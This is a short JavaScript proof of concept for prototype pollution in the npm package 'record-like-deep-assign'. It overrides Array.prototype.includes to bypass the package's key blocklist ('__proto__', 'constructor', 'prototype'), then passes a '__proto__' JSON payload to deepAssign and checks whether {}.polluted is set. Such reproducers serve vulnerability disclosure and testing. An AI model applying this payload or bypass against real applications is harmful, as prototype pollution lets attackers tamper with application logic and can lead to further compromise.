Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
const deepAssign = require('record-like-deep-assign');
console.log({}.polluted);
let obj = {};
EVIL_JSON = JSON.parse('{"__proto__":{"polluted":"yes"}}');
deepAssign({}, EVIL_JSON);
console.log({}.polluted);